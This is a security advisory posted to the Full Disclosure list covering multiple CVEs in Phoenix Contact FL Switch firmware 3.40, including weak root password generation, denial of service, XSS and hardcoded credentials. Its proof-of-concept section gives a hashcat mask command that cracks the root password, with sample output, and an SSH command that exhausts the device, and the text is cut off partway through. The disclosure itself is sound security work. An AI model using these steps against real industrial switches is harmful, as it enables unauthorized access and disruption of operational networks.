---
title: CyberDanube Security Research 20251215-0 | Multiple Vulnerabilities in Phoenix Contact FL Switch Series
url: https://seclists.org/fulldisclosure/2025/Dec/26
source: Full Disclosure
date: 2025-12-18
fetch_date: 2025-12-19T03:23:36.933787
---

# CyberDanube Security Research 20251215-0 | Multiple Vulnerabilities in Phoenix Contact FL Switch Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](25)
[By Thread](index.html#26)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20251215-0 | Multiple Vulnerabilities in Phoenix Contact FL Switch Series

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 17 Dec 2025 14:11:32 +0000

---

```
CyberDanube Security Research 20251215-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| FL Switch
   vulnerable version| 3.40
        fixed version| TODO
           CVE number| CVE-2025-41692, CVE-2025-41693, CVE-2025-41694,
                     | CVE-2025-41695, CVE-2025-41696, CVE-2025-41697,
                     | CVE-2025-41745, CVE-2025-41746, CVE-2025-41747,
                     | CVE-2025-41748, CVE-2025-41749, CVE-2025-41750,
                     | CVE-2025-41751, CVE-2025-41752
               impact| High
             homepage| https://www.phoenixcontact.com/
                found| 16.04.2025
                   by| D. Blagojevic, S. Dietz, F. Koroknai, T. Weber
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     | This research was conducted in cooperation with Verbund
                     | OT Cyber Security Lab during a penetration test.
                     |
                     | https://www.cyberdanube.com
                     |
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"What we do
Connecting, distributing, and controlling power and data flows - we have been
developing the right products for this purpose since 1923. Whether in
industrial production facilities, in the field of renewable energies, in
infrastructure, or for complex device connections: our solutions are used
wherever processes must run automatically. Above and beyond their pure
function, they help our partners to develop sustainable applications with more
efficient processes and reduced costs.

We are Phoenix Contact: With innovative products and solutions, we are paving
the way to a climate-neutral and sustainable world."

Source: https://www.phoenixcontact.com/en-us/company

Vulnerable versions
-------------------------------------------------------------------------------
Tested on FL SWITCH 2306-2SFP PN version 3.40

Find more information about affected products on the VDE Cert website:
https://certvde.com/de/advisories/VDE-2025-071

Vulnerability overview
-------------------------------------------------------------------------------
1) Weak/Predictable root Password (CVE-2025-41692)
The device's root password is generated with weak a weak ruleset. An attacker
with access to the administration password can bruteforce it in seconds. The
"password" part of the password is equal to the password set in the web
interface.

2) Authenticated Denial-of-Service via SSH (CVE-2025-41693)
The device is vulenrable to a denial of service condition when ssh is enabled.
An authenticated attacker can exploit this issue to make the device unresponsive

3) Authenticated Denial-of-Service via Webshell (CVE-2025-41694)
The webshell is vulnerable to a denial of service condition. An authenticated
attacker can exploit this issue to make the webserver unresponsive.

4) Multiple Reflected Cross-Site Scripting Vulnerabilities (CVE-2025-41695,
CVE-2025-41745 - CVE-2025-41752)
Multiple GET and POST requests can be used to trigger reflected cross-site
scripting vulnerabilities. This can be used to execute malicious code in the
context of a user’s browser. Cookies may be also stoled via this way.

5) Hardcoded User Password (CVE-2025-41696)
The device's "user" account has weak hardcoded credentials. An attacker with
physical access could abuse this to gain serial access.

6) Access to UART Console (CVE-2025-41697)
The device exposes a UART console on the PCB, which allows an attacker to
interact with the Linux operating system. Based on vulnerability 5), an
attacker can login with hardcoded credentials to the system. This attack
requires physical access.

Proof of Concept
-------------------------------------------------------------------------------
1) Weak/Predictable root Password (CVE-2025-41692)
The root password is generated using the mask "<pw>\*[0-9][8]". The following
hashcat configuration can be used to calculate the password if administration
credentials are known.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hashcat -m 500 -a 3 hash.txt password*?d?d?d?d?d?d?d?d --force
$1$Y8/euSU2$l42H5Fox4UvOIwt4cCyUL1:password*92016123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$Y8/euSU2$l42H5Fox4UvOIwt4cCyUL1
Time.Started.....: Mon Apr 14 13:25:20 2025, (3 secs)
Time.Estimated...: Mon Apr 14 13:25:23 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: password*?d?d?d?d?d?d?d?d [17]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   121.3 kH/s (59.56ms) @ Accel:4 Loops:250 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 399360/100000000 (0.40%)
Rejected.........: 0/399360 (0.00%)
Restore.Point....: 368640/100000000 (0.37%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: password*13636123 -> password*62273232
Hardware.Mon.#1..: Temp: 69c Util:100% Core: 210MHz Mem: 405MHz Bus:16
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
A possible password would be "SuperStrongPassword*92016123". It is generated
from the combination of the web interface password (SuperStrongPassword) and
the appended asterisk plus the eight digit number. The password is newly
generated on each new start of the device.

-------------------------------------------------------------------------------
2) Authenticated Denial-of-Service via SSH (CVE-2025-41693)
The dropbear is modified by the manufacturer. When using the ssh feature to
execute commands directly after login, the process stays open and uses resources.
After ~6 connections the device becomes unresponsive.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
attacker$ ssh <known_user>@<IP> echo DOS

switch$ top
Mem: 62024K used, 62996K free, 0K shrd, 0K buff, 21576K cached
CPU:  13% usr  86% sys   0% nic   0% idle   0% io   0% irq   0% sirq
Mem: 63016K used, 62004K free, 0K shrd, 0K buff, 21576K cached
CPU:  12% usr  86% sys   0% nic   0% idle   0% io   0% irq   0% sirq
Load average: 6.97 3.47 1.44 7/190 1393
  PID  PPID USER     STAT   VSZ %VSZ CPU %CPU COMMAND
 1163  1162 root     R     6896   6%   0  14% /usr/bin/pxc_cli -ssh
 1246  1244 root     R     6896   6%   0  14% /usr/bin/pxc_cli -ssh
 1294  1293 root     R     6896   6%   0  14% /usr/bin/pxc_cli -ssh
 1233  1232 root     R     6896   6%   0  14% /usr/bin/pxc_cli -ssh
 1255  1254 root     R     6896   6%   0  14% /usr/bin/pxc_cli -ssh
 1385  1384 root     R     6892   6%   0  14% /usr/bin/pxc_cli -ssh
 1121  1093 apache   S    24752  20%   0   7% /usr/bin/php -c /dev/shm/php.ini
  842    ...